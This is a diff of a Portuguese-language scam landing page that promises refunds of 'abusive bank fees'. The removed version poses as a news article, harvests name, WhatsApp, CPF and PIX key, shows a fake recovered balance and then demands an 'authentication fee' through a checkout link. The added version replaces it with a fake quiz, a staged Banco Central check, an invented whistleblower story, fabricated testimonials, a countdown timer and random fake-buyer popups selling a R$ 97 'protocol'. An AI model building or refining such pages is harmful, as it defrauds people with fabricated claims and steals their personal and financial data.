@@ -2,199 +2,184 @@
 <html lang="pt-br">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Portal Financeiro - Auditoria de Tarifas</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;800&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistema de Auditoria - Protocolo Oficial</title>
     <style>
-        :root { --primary: #0a2540; --accent: #00d4ff; --success: #00d97e; --text: #1a1f23; }
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; }
-        body { background: #f4f7f9; color: var(--text); }
-
-        header { background: #fff; padding: 15px 20px; border-bottom: 2px solid #e2e8f0; display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100; }
-        .logo { font-weight: 800; font-size: 16px; color: var(--primary); letter-spacing: -1px; }
-        .live-dot { display: flex; align-items: center; gap: 5px; font-size: 12px; font-weight: 700; color: #ef4444; }
-        .dot { width: 8px; height: 8px; background: #ef4444; border-radius: 50%; animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
-
-        .main-container { max-width: 500px; margin: 0 auto; background: #fff; min-height: 100vh; box-shadow: 0 0 20px rgba(0,0,0,0.05); }
-        .content { padding: 20px; }
-
-        .kicker { color: #b91c1c; font-weight: 800; font-size: 12px; text-transform: uppercase; margin-bottom: 8px; display: block; }
-        h1 { font-size: 24px; font-weight: 800; line-height: 1.2; color: #1a1f23; margin-bottom: 15px; }
-        .meta { font-size: 13px; color: #64748b; margin-bottom: 20px; padding-bottom: 15px; border-bottom: 1px solid #f1f5f9; }
-        .article-p { font-size: 16px; line-height: 1.6; color: #334155; margin-bottom: 20px; }
-
-        .cta-start { background: var(--primary); color: #fff; padding: 20px; border-radius: 12px; text-align: center; cursor: pointer; font-weight: 700; font-size: 18px; margin: 25px 0; border: none; width: 100%; animation: grow 2s infinite; }
-        @keyframes grow { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.02); } }
-
-        #funnel-container { display: none; padding: 20px; background: #fff; border-radius: 16px; border: 2px solid #e2e8f0; margin-top: 20px; }
-        .step { display: none; }
-        .step.active { display: block; animation: slideIn 0.3s ease; }
-        @keyframes slideIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-
-        .question { font-size: 18px; font-weight: 700; color: var(--primary); margin-bottom: 20px; text-align: center; }
-        input { width: 100%; padding: 16px; border: 2px solid #e2e8f0; border-radius: 10px; font-size: 16px; margin-bottom: 15px; outline: none; }
-        input:focus { border-color: var(--accent); }
-
-        .grid-opts { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px; }
-        .opt-card { border: 2px solid #e2e8f0; padding: 15px; border-radius: 10px; text-align: center; font-weight: 600; font-size: 13px; cursor: pointer; transition: 0.2s; background: #f8fafc; }
-        .opt-card.selected { border-color: var(--primary); background: #f1f5f9; color: var(--primary); box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
-
-        .btn-next { background: var(--primary); color: #fff; border: none; width: 100%; padding: 18px; border-radius: 10px; font-weight: 700; font-size: 16px; cursor: pointer; margin-top: 10px; }
+        /* CSS BASE */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Arial, sans-serif; }
+        body { background-color: #f0f2f5; color: #333; }
+        header { background-color: #002e5d; color: white; padding: 12px; text-align: center; font-size: 13px; font-weight: bold; position: sticky; top: 0; z-index: 100; }
+        .container { width: 100%; max-width: 500px; margin: 0 auto; background: white; min-height: 100vh; box-shadow: 0 0 15px rgba(0,0,0,0.1); }
         
-        .loader { text-align: center; padding: 40px 0; }
-        .spinner { width: 50px; height: 50px; border: 5px solid #f1f5f9; border-top: 5px solid var(--primary); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
-        @keyframes spin { 100% { transform: rotate(360deg); } }
+        /* BARRA DE ESCASSEZ */
+        .scarcity-bar { background: #ffeb3b; color: #000; padding: 8px; text-align: center; font-size: 13px; font-weight: bold; border-bottom: 1px solid #ddd; }
 
-        .balance-box { background: var(--primary); color: #fff; padding: 30px; border-radius: 12px; text-align: center; margin-bottom: 25px; }
-        .amt { display: block; font-size: 40px; font-weight: 800; color: var(--success); }
-        .tax-alert { background: #fff1f0; border: 1px solid #ffa39e; padding: 15px; border-radius: 8px; color: #a8071a; font-size: 14px; margin-top: 20px; }
+        /* SEÇÕES */
+        .section { padding: 20px; display: none; }
+        .active { display: block; }
 
-        .proof { text-align: center; font-size: 12px; color: #64748b; margin-top: 30px; padding-bottom: 40px; }
+        /* ESTILO QUIZ */
+        h2 { font-size: 22px; color: #002e5d; margin-bottom: 20px; text-align: center; line-height: 1.3; }
+        .btn-quiz { display: block; width: 100%; background: #f8f9fa; border: 2px solid #002e5d; color: #002e5d; padding: 15px; margin-bottom: 12px; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; text-align: center; transition: 0.3s; }
+        .btn-quiz:active { background: #002e5d; color: white; }
+
+        /* LOADING */
+        .loading-box { text-align: center; padding: 40px 20px; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #28a745; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* PÁGINA DE VENDAS (RESULTADO) */
+        .result-card { background: #e7f3ff; border: 2px dashed #002e5d; padding: 15px; border-radius: 8px; text-align: center; margin-bottom: 20px; }
+        .price-big { font-size: 36px; color: #28a745; font-weight: bold; margin: 10px 0; }
+        .headline-red { color: #d32f2f; font-size: 24px; font-weight: bold; line-height: 1.2; margin-bottom: 15px; }
+        .img-fluid { width: 100%; border-radius: 8px; margin-bottom: 15px; }
+
+        /* DEPOIMENTOS FACEBOOK */
+        .fb-comments { border-top: 1px solid #e9ebee; margin-top: 30px; padding-top: 15px; }
+        .comment { display: flex; margin-bottom: 15px; font-size: 13px; }
+        .comment img { width: 36px; height: 36px; border-radius: 50%; margin-right: 10px; }
+        .comment-content { background: #f2f3f5; padding: 8px 12px; border-radius: 15px; flex: 1; }
+        .comment-name { font-weight: bold; color: #365899; }
+
+        /* BOTÃO DE COMPRA */
+        .cta-box { text-align: center; padding: 20px; background: #f9f9f9; border-radius: 10px; margin-top: 20px; }
+        .btn-cta { display: block; background: #28a745; color: white; padding: 20px; text-decoration: none; border-radius: 8px; font-size: 20px; font-weight: bold; animation: pulse 2s infinite; }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
+
+        /* POPUP */
+        #popup-venda { position: fixed; bottom: 15px; left: 15px; background: white; padding: 10px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.2); display: none; align-items: center; z-index: 1000; border-left: 4px solid #28a745; animation: slideIn 0.5s; }
+        @keyframes slideIn { from { transform: translateX(-100%); } to { transform: translateX(0); } }
     </style>
 </head>
 <body>
 
-<header>
-    <div class="logo">PORTAL ECONÔMICO</div>
-    <div class="live-dot"><div class="dot"></div> 1.409 ONLINE AGORA</div>
-</header>
+<header>SISTEMA DE AUDITORIA TARIFÁRIA - PROTOCOLO R892</header>
+<div class="scarcity-bar">Vagas para consulta liberadas até: <span id="timer">15:00</span></div>
 
-<div class="main-container">
-    <div id="article-section" class="content">
-        <span class="kicker">ECONOMIA HOJE</span>
-        <h1>Justiça autoriza devolução de taxas cobradas indevidamente em cartões e empréstimos</h1>
-        <div class="meta">Por <b>Redação Central</b> • Atualizado agora</div>
+<div class="container">
+    
+    <div id="quiz" class="section active">
+        <br>
+        <h2>Verifique se você tem valores a receber nos últimos 5 anos</h2>
+        <p style="text-align:center; margin-bottom:20px; color:#666;">Responda rápido para iniciar a busca:</p>
         
-        <p class="article-p">A auditoria identificou que milhões de brasileiros pagaram taxas abusivas e juros acima do permitido em contratos de empréstimo e faturas de cartão.</p>
-        
-        <p class="article-p">A restituição pode chegar a <b>R$ 8.500,00</b> por pessoa. O sistema de consulta foi liberado para resgate via PIX.</p>
+        <p><b>1. Você possui conta em banco (Itaú, Bradesco, Santander, BB, etc)?</b></p>
+        <div class="btn-quiz" onclick="nextStep('quiz2')">Sim, possuo</div>
+        <div class="btn-quiz" onclick="nextStep('quiz2')">Não possuo</div>
 
-        <button class="cta-start" onclick="startFunnel()">CONSULTAR MEU VALOR AGORA</button>
-        
-        <p class="article-p" style="font-size: 14px; color: #64748b; text-align: center;">Consulta segura e imediata.</p>
+        <div id="quiz2" style="display:none; margin-top:20px;">
+            <p><b>2. Já fez algum empréstimo ou usou cartão de crédito desde 2019?</b></p>
+            <div class="btn-quiz" onclick="nextStep('loading')">Sim, várias vezes</div>
+            <div class="btn-quiz" onclick="nextStep('loading')">Raramente</div>
+        </div>
     </div>
 
-    <div id="funnel-container">
-        
-        <div id="step1" class="step active">
-            <p class="question">Para começar, qual seu nome completo?</p>
-            <input type="text" id="in_nome" placeholder="Digite seu nome">
-            <button class="btn-next" onclick="nextStep(2)">CONTINUAR</button>
+    <div id="loading" class="section">
+        <div class="loading-box">
+            <div class="spinner"></div>
+            <h3 id="load-text">Cruzando dados com o Banco Central...</h3>
+            <p style="color:#666; font-size:14px; margin-top:10px;">Não feche esta página.</p>
         </div>
-
-        <div id="step2" class="step">
-            <p class="question">Qual seu WhatsApp?</p>
-            <input type="tel" id="in_tel" placeholder="(00) 00000-0000">
-            <button class="btn-next" onclick="nextStep(3)">PRÓXIMO</button>
-        </div>
-
-        <div id="step3" class="step">
-            <p class="question">Você possuiu algum destes serviços nos últimos 10 anos?</p>
-            <div class="grid-opts">
-                <div class="opt-card" onclick="toggle(this)">Cartão de Crédito</div>
-                <div class="opt-card" onclick="toggle(this)">Empréstimos</div>
-                <div class="opt-card" onclick="toggle(this)">Financiamentos</div>
-                <div class="opt-card" onclick="toggle(this)">Contas Antigas</div>
-            </div>
-            <button class="btn-next" onclick="nextStep(4)">CONFIRMAR</button>
-        </div>
-
-        <div id="step4" class="step">
-            <p class="question">Selecione os bancos onde você teve esses serviços:</p>
-            <div class="grid-opts">
-                <div class="opt-card" onclick="toggle(this)">Nubank</div>
-                <div class="opt-card" onclick="toggle(this)">Itaú</div>
-                <div class="opt-card" onclick="toggle(this)">Caixa</div>
-                <div class="opt-card" onclick="toggle(this)">Bradesco</div>
-                <div class="opt-card" onclick="toggle(this)">Inter</div>
-                <div class="opt-card" onclick="toggle(this)">Santander</div>
-            </div>
-            <button class="btn-next" onclick="nextStep(5)">FINALIZAR SELEÇÃO</button>
-        </div>
-
-        <div id="step5" class="step">
-            <p class="question">Informe seu CPF para localizar os valores:</p>
-            <input type="number" id="in_cpf" placeholder="000.000.000-00">
-            <button class="btn-next" onclick="startLoading()">VERIFICAR SALDOS</button>
-        </div>
-
-        <div id="loading" class="step">
-            <div class="loader">
-                <div class="spinner"></div>
-                <p id="load-msg" style="font-weight:700;">Localizando tarifas abusivas...</p>
-            </div>
-        </div>
-
-        <div id="step6" class="step">
-            <div class="balance-box">
-                <span style="font-size:12px; opacity:0.8;">SALDO LOCALIZADO:</span>
-                <span class="amt">R$ 3.842,15</span>
-            </div>
-            <p class="question" style="font-size:16px;">Como deseja receber seu dinheiro?</p>
-            <div class="grid-opts">
-                <div class="opt-card" onclick="toggle(this, true)">PIX (Imediato)</div>
-                <div class="opt-card" onclick="toggle(this, true)">Depósito</div>
-            </div>
-            <input type="text" placeholder="Chave PIX (CPF, Celular ou Email)">
-            <button class="btn-next" style="background:var(--success)" onclick="finalProcess()">SACAR VIA PIX AGORA</button>
-        </div>
-
-        <div id="step7" class="step">
-            <h2 style="color:var(--primary); text-align:center;">SAQUE BLOQUEADO</h2>
-            <div class="tax-alert">
-                <strong>⚠️ AÇÃO NECESSÁRIA:</strong><br>
-                Para liberar o envio do saldo de R$ 3.842,15, é necessário pagar a <b>Tarifa de Autenticação (R$ 27,90)</b> exigida pelo sistema de segurança.
-            </div>
-            <p style="font-size:13px; margin:20px 0; text-align:center;">Este valor será reembolsado automaticamente em sua conta junto com o seu saldo em até 1 minuto.</p>
-            <div style="background:#f1f5f9; padding:15px; border-radius:10px; text-align:center; margin-bottom:20px; border: 1px solid #e2e8f0;">
-                <p style="font-size:12px; color:#64748b;">Total a ser creditado:</p>
-                <p style="font-size:26px; font-weight:800; color:var(--success);">R$ 3.870,05</p>
-            </div>
-            <button class="btn-next" onclick="window.location.href='https://pay.checkoutpixes.com/checkout/cmno3t5gq02ha1yqmetvdd6v6?offer=D3VNASJ'">PAGAR TARIFA E RECEBER PIX</button>
-        </div>
-
     </div>
 
-    <div class="proof">
-        <p>✅ <b>1.409 pessoas</b> já consultaram e receberam hoje.</p>
+    <div id="pv" class="section">
+        <div class="result-card">
+            <p>CONSULTA FINALIZADA!</p>
+            <div class="price-big">R$ 2.748,50</div>
+            <p style="font-size:13px;">Estimativa de restituição disponível</p>
+        </div>
+
+        <h1 class="headline-red">Eles me demitiram para esconder esse código, mas agora ele é seu.</h1>
+        
+        <img src="LINK_DA_ROBERTA_CARRO_AQUI" class="img-fluid" alt="Roberta">
+        <p style="font-size:12px; text-align:center; color:#666; margin-top:-10px;"><i>Foto registrada logo após minha demissão.</i></p>
+
+        <p>Meu nome é <b>Roberta</b>. Fui auditora sênior por 12 anos. Quando descobri que os bancos escondiam esse dinheiro dos clientes, fui posta na rua.</p>
+        <br>
+        <p>Mas eu trouxe o <b>Protocolo de Ativação</b>. Com ele, você não precisa de advogado para recuperar suas taxas.</p>
+
+        <div style="background:#f4f4f4; padding:15px; border-radius:8px; margin:20px 0;">
+            <p><b>O que você recebe agora:</b></p>
+            <p>✅ Gerador de Requerimentos Oficial</p>
+            <p>✅ Mapa de Cliques (Passo a passo)</p>
+            <p>✅ Acesso Vitalício ao Sistema</p>
+        </div>
+
+        <div class="cta-box">
+            <p style="text-decoration:line-through; color:#999;">De R$ 497,00</p>
+            <p style="font-size:20px;">Por apenas <b>R$ 97,00</b></p>
+            <br>
+            <a href="LINK_DO_SEU_CHECKOUT_AQUI" class="btn-cta">ATIVAR MEU SAQUE AGORA</a>
+            <p style="font-size:11px; margin-top:10px; color:#666;">Acesso enviado imediatamente via E-mail e WhatsApp.</p>
+        </div>
+
+        <div class="fb-comments">
+            <p style="font-weight:bold; color:#4b4f56; margin-bottom:15px;">Comentários (14)</p>
+            
+            <div class="comment">
+                <img src="https://i.pravatar.cc/100?u=1" alt="Dona Neide">
+                <div class="comment-content">
+                    <span class="comment-name">Dona Neide Lopes</span>
+                    <p>O meu caiu hoje! R$ 1.240 direto na conta. Achei que era mentira da Roberta mas é sério.</p>
+                </div>
+            </div>
+
+            <div class="comment">
+                <img src="https://i.pravatar.cc/100?u=2" alt="Marcos">
+                <div class="comment-content">
+                    <span class="comment-name">Marcos Oliveira</span>
+                    <p>Valeu cada centavo. O gerente do banco até tentou me enrolar, mas com o documento pronto não teve conversa.</p>
+                </div>
+            </div>
+        </div>
+        <br>
+        <center><img src="LINK_DOS_SELOS_DE_SEGURANÇA_AQUI" width="180" style="opacity:0.5;"></center>
+        <br>
+    </div>
+</div>
+
+<div id="popup-venda">
+    <div style="background:#28a745; color:white; border-radius:50%; width:24px; height:24px; text-align:center; line-height:24px; font-weight:bold;">✓</div>
+    <div style="margin-left:10px; font-size:12px;">
+        <span id="nome-pop">Maria S.</span> acaba de ativar o protocolo!
     </div>
 </div>
 
 <script>
-    function startFunnel() {
-        document.getElementById('article-section').style.display = 'none';
-        document.getElementById('funnel-container').style.display = 'block';
-        window.scrollTo(0, 0);
-    }
-
-    function nextStep(n) {
-        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
-        document.getElementById('step' + n).classList.add('active');
-    }
-
-    function toggle(el, single = false) {
-        if(single) {
-            el.parentElement.querySelectorAll('.opt-card').forEach(c => c.classList.remove('selected'));
+    // LÓGICA DE NAVEGAÇÃO
+    function nextStep(stepId) {
+        if(stepId === 'quiz2') {
+            document.getElementById('quiz2').style.display = 'block';
+        } else {
+            document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+            document.getElementById(stepId).classList.add('active');
+            
+            if(stepId === 'loading') {
+                setTimeout(() => { document.getElementById('load-text').innerText = "Verificando saldo retido..."; }, 1500);
+                setTimeout(() => { document.getElementById('load-text').innerText = "Liberando Protocolo R892..."; }, 3000);
+                setTimeout(() => { nextStep('pv'); }, 4500);
+            }
         }
-        el.classList.toggle('selected');
     }
 
-    function startLoading() {
-        nextStep('loading');
-        const msgs = ["Auditando Taxas...", "Buscando Contratos...", "Calculando Juros...", "Gerando Relatório..."];
-        let i = 0;
-        const it = setInterval(() => {
-            if(i < msgs.length) { document.getElementById('load-msg').innerText = msgs[i]; i++; }
-            else { clearInterval(it); nextStep(6); }
-        }, 1200);
-    }
+    // CRONÔMETRO
+    let time = 900;
+    const timerElement = document.getElementById('timer');
+    setInterval(() => {
+        let min = Math.floor(time / 60);
+        let sec = time % 60;
+        timerElement.innerText = `${min}:${sec < 10 ? '0'+sec : sec}`;
+        if(time > 0) time--;
+    }, 1000);
 
-    function finalProcess() {
-        nextStep('loading');
-        document.getElementById('load-msg').innerText = "Processando transferência PIX...";
-        setTimeout(() => { nextStep(7); }, 2500);
-    }
+    // POPUPS DE VENDA
+    const nomes = ["Seu José", "Dona Sueli", "Ricardo M.", "Ana Paula", "Claudio F.", "Marinalva S."];
+    setInterval(() => {
+        document.getElementById('nome-pop').innerText = nomes[Math.floor(Math.random()*nomes.length)];
+        const pop = document.getElementById('popup-venda');
+        pop.style.display = 'flex';
+        setTimeout(() => { pop.style.display = 'none'; }, 5000);
+    }, 15000);
 </script>
 
 </body>
